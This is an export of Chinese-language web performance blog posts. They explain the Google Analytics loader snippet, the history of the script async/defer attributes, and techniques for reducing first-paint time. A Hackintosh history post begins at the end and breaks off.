class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 